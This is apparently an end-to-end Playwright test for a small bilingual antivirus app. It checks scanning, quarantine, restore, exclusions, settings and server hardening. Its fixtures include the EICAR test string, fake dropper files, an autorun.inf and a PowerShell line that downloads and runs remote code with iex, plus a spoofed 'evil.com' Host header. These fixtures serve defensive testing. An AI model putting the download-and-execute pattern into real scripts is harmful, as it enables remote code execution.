const { chromium } = require('playwright');
const { spawn } = require('child_process');
const fs = require('fs'), path = require('path');
const T = process.argv[2]; const BIN = process.argv[3];
const DATA = T + '/e2e/data', APPD = T + '/e2e/appdata', PORT = 18787; fs.mkdirSync(T + '/e2e', { recursive: true });
fs.rmSync(DATA, { recursive: true, force: true }); fs.rmSync(APPD, { recursive: true, force: true });
const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
const w = (p, c) => { fs.mkdirSync(path.dirname(DATA + '/' + p), { recursive: true }); fs.writeFileSync(DATA + '/' + p, c); };
// bad
w('eicar.txt', EICAR); w('invoice.pdf.exe', 'MZ fake'); w('holiday.jpg', 'MZ' + 'x'.repeat(100)); w('usb/autorun.inf', '[autorun]\nopen=bad.exe\n');
w('tools/install.ps1', 'powershell -enc AAA; (New-Object Net.WebClient).DownloadString("http://x"); iex $x');
// innocent
w('notes.txt', 'my notes'); w('Desktop/report.docx', 'PK docx data ....'); w('pic.jpg', '\xff\xd8\xff\xe0 jpeg ' + 'y'.repeat(100)); w('setup.exe', 'MZ clean installer'); w('readme.md', '# hello');
const innocent = ['notes.txt', 'Desktop/report.docx', 'pic.jpg', 'setup.exe', 'readme.md'];
const bad = ['eicar.txt', 'invoice.pdf.exe', 'holiday.jpg', 'usb/autorun.inf'];
const ex = f => fs.existsSync(DATA + '/' + f);
const results = []; const ok = (name, cond, extra) => { results.push([name, !!cond]); console.log((cond ? 'PASS ' : 'FAIL ') + name + (extra ? '  ' + extra : '')); };
const srv = spawn(BIN, [String(PORT)], { env: { ...process.env, APPDATA: APPD }, stdio: ['ignore', 'pipe', 'inherit'] });
(async () => {
  await new Promise(r => srv.stdout.once('data', r));
  const b = await chromium.launch(); const ctx = await b.newContext({ viewport: { width: 1100, height: 760 } }); const p = await ctx.newPage();
  const errs = []; p.on('pageerror', e => errs.push(e.message)); p.on('console', m => { if (m.type() === 'error') errs.push(m.text()); });
  await p.goto(`http://127.0.0.1:${PORT}/`); await p.waitForTimeout(800);
  ok('UI loaded in Persian RTL', await p.evaluate(() => document.documentElement.dir === 'rtl' && document.title === 'Mini AV'));
  await p.screenshot({ path: 'e2e-home.png' });
  // custom scan of DATA
  await p.click('[data-page=scan]'); await p.click('.mode:nth-child(3)');
  await p.fill('#pathIn', DATA); await p.click('#btnAdd');
  await p.click('#btnStart'); await p.waitForSelector('#vAdmin.on'); await p.screenshot({ path: 'e2e-admin.png' });
  await p.click('#adminSkip');
  await p.waitForSelector('.bar.done', { timeout: 30000 }); await p.waitForTimeout(800);
  await p.screenshot({ path: 'e2e-results.png', fullPage: false });
  const rows = await p.$$eval('.trow', els => els.map(e => ({ cls: e.className, text: e.innerText })));
  ok('4 confirmed threats + 1 suspicious listed', rows.filter(r => r.cls.includes('high')).length === 4 && rows.filter(r => r.cls.includes('medium')).length === 1, JSON.stringify(rows.map(r => r.cls)));
  ok('confirmed threats auto-quarantined (files removed)', bad.every(f => !ex(f)));
  ok('suspicious script NOT touched', ex('tools/install.ps1'));
  ok('all innocent files untouched', innocent.every(ex), innocent.filter(f => !ex(f)).join(','));
  ok('innocent content intact', fs.readFileSync(DATA + '/notes.txt', 'utf8') === 'my notes' && fs.readFileSync(DATA + '/setup.exe', 'utf8') === 'MZ clean installer');
  // quarantine page
  await p.click('[data-page=quarantine]'); await p.waitForTimeout(700);
  const qn = await p.$$eval('.qrow', e => e.length); ok('quarantine page lists 4 items', qn === 4, 'got ' + qn); await p.screenshot({ path: 'e2e-quarantine.png' });
  const qdir = APPD + '/MiniAV/Quarantine';
  const qfiles = fs.readdirSync(qdir); ok('quarantine store holds obfuscated copies', qfiles.filter(f => f.endsWith('.qar')).length === 4);
  ok('no EICAR text readable inside quarantine', !qfiles.filter(f => f.endsWith('.qar')).some(f => fs.readFileSync(qdir + '/' + f).includes('EICAR-STANDARD')));
  // restore the eicar one
  const eicarRow = (await p.$$('.qrow')).find(async () => true);
  const idx = await p.$$eval('.qrow', els => els.findIndex(e => e.innerText.includes('EICAR')));
  await (await p.$$('.qrow'))[idx].$('text=/بازیابی/').then(h => h.click()); await p.waitForTimeout(800);
  ok('restore brings the file back byte-for-byte', ex('eicar.txt') && fs.readFileSync(DATA + '/eicar.txt', 'utf8') === EICAR);
  ok('restored item left the quarantine', (await p.$$eval('.qrow', e => e.length)) === 3);
  // kill all
  await p.click('#btnKill'); await p.waitForSelector('#vKill.on'); await p.click('#killGo'); await p.waitForTimeout(1200);
  await p.screenshot({ path: 'e2e-after-kill.png' });
  ok('Kill all viruses empties quarantine', (await p.$$eval('.qrow', e => e.length)) === 0 && fs.readdirSync(qdir).length === 0);
  ok('Kill all keeps suspicious + innocent files', ex('tools/install.ps1') && innocent.every(ex) && ex('eicar.txt'), 'restored eicar stays until next scan');
  // ignore the suspicious script, rescan
  await p.click('[data-page=scan]'); await p.click('#btnStart'); await p.waitForSelector('.bar.done', { timeout: 30000 }); await p.waitForTimeout(500);
  const ig = await p.$('.trow.medium >> text=/نادیده/'); if (ig) await ig.click(); await p.waitForTimeout(500);
  const excl = fs.existsSync(APPD + '/MiniAV/exclusions.txt') ? fs.readFileSync(APPD + '/MiniAV/exclusions.txt', 'utf8') : '';
  ok('Ignore stores an exclusion', excl.includes('install.ps1'));
  await p.click('#btnStart'); await p.waitForSelector('.bar.done', { timeout: 30000 }); await p.waitForTimeout(500);
  const rows2 = await p.$$eval('.trow', els => els.map(e => e.className));
  ok('ignored script no longer reported', !rows2.some(c => c.includes('medium')));
  // language + settings persistence
  await p.click('[data-page=settings]'); await p.click('.seg button[data-lang=en] >> nth=0'); await p.waitForTimeout(500);
  ok('switch to English (LTR)', await p.evaluate(() => document.documentElement.dir === 'ltr' && document.querySelector('.nav.on span').textContent === 'Settings'));
  await p.screenshot({ path: 'e2e-settings-en.png' });
  const st = fs.readFileSync(APPD + '/MiniAV/settings.txt', 'utf8');
  ok('settings saved (lang + last scan)', st.includes('lang=en') && st.includes('last_time='), st.replace(/\n/g, ' '));
  const log = fs.readFileSync(APPD + '/MiniAV/actions.log', 'utf8');
  ok('audit log records actions', (log.match(/QUARANTINE/g) || []).length >= 4 && log.includes('DELETE') && log.includes('RESTORE'));
  // server hardening
  const bad1 = await new Promise(res => require('http').get({ host: '127.0.0.1', port: PORT, path: '/', headers: { Host: 'evil.com' } }, r => { r.resume(); res(r.statusCode); }));
  const bad2 = await fetch(`http://127.0.0.1:${PORT}/ipc`, { method: 'POST', body: 'killall' }).then(r => r.status);
  ok('foreign Host header rejected', bad1 === 403, String(bad1)); ok('POST without custom header rejected', bad2 === 403, String(bad2));
  ok('no JS errors in the page', errs.length === 0, errs.join(' | '));
  await b.close(); srv.kill();
  const failed = results.filter(r => !r[1]).length; console.log(`\n${results.length - failed}/${results.length} passed`); process.exit(failed ? 1 : 0);
})().catch(e => { console.error('E2E CRASH', e); srv.kill(); process.exit(2); });
